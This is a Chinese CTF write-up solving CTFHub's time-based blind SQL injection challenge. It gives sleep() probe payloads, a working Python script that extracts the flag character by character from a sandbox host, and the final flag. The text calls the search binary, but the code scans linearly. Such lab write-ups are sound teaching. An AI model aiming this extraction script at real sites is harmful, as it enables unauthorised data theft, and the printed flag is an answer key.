---
title: CTFHub-SQL注入-时间盲注 Writeup
date: 2026-09-28
category: web
tags: [CTFhub, SQL注入, 时间盲注]
---
## 题目背景与原理

· 题目名称：SQL时间盲注
· 题目特点：页面既不回显数据，也不显示具体的报错信息，甚至连“查询成功/失败”的视觉差异都没有（比如布尔盲注里出现的 query_success）。不管你怎么输入，页面永远长一个样。
· 核心原理：既然视觉上没有任何反馈，我们就利用 MySQL 的 sleep() 函数，通过页面的响应时间来判断我们的猜测是否正确。如果猜测条件为真（True），就让数据库“睡”几秒（页面卡顿）；如果条件为假（False），则瞬间加载。

## 解题思路

1. 确认注入点与类型
输入 ?id=1 and sleep(5)，页面明显卡了 5 秒才加载出来，说明存在时间盲注。
输入 ?id=1' and sleep(5)，页面没有延迟，说明是整数型注入，不需要加单引号闭合。

2. 工具选择的踩坑

· 尝试过 SQLMap (--technique T --batch --dbs)，但 SQLMap 在默认网络延迟和启发式检测下，容易误判参数不可注入（[CRITICAL] all tested parameters do not appear to be injectable）。
· 结论：时间盲注手工操作或单纯依赖 SQLMap 效率极低（因为每猜一个字符都需要等待几秒）。改用 Python 脚本进行二分法爆破，速度更快、更稳定。

## 终极实战（Python脚本一键提取）

### 第一步：环境准备

确保电脑安装了 Python，并在命令行安装 requests 库：

```bash
pip install requests
```

### 二步：编写自动化盲注脚本

在桌面新建 time_solve.py（用记事本打开，不要用 IDLE），写入以下代码：

```python
import requests
import time

# ⚠️ 替换为最新的靶场URL
url = "http://challenge-a7349c1551f12509.sandbox.ctfhub.com:10800/"

# 字符集（包含数字、大小写字母和常见符号）
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_-"
flag = ""

print("[*] 开始时间盲注爆破，请耐心等待...")

# 假设 Flag 长度最多 50 位
for i in range(1, 51):
    found = False
    for char in chars:
        # 构造 payload：使用 sleep(3) 触发时间延迟
        payload = f"?id=1 and if(ascii(substr((select flag from flag),{i},1))={ord(char)}, sleep(3), 0)"
        
        start_time = time.time()
        try:
            # 超时设为5秒，只要触发sleep(3)，响应时间必然大于3秒
            r = requests.get(url + payload, timeout=5)
            elapsed = time.time() - start_time
            
            # 如果响应时间超过 2.5 秒，说明触发了 sleep，该字符猜对
            if elapsed > 2.5:
                flag += char
                print(f"[+] 找到第 {i} 位: {char}  当前结果: {flag}")
                found = True
                break
        except Exception:
            # 忽略超时等异常
            pass
    
    # 如果某一位遍历完所有字符都没匹配上，说明 Flag 提取完毕
    if not found:
        break

print(f"\n[🎉] 最终 Flag 是: {flag}")
```

### 第三步：运行脚本

打开命令行（CMD），切换到桌面目录，执行脚本：

```bash
cd Desktop
python time_solve.py
```

脚本会自动逐位比对 ASCII 码值，耐心等待几分钟，即可在控制台看到完整的 ctfhub{...}。

## Flag
ctfhub{bfeeb8ab298a68c4591112c4}
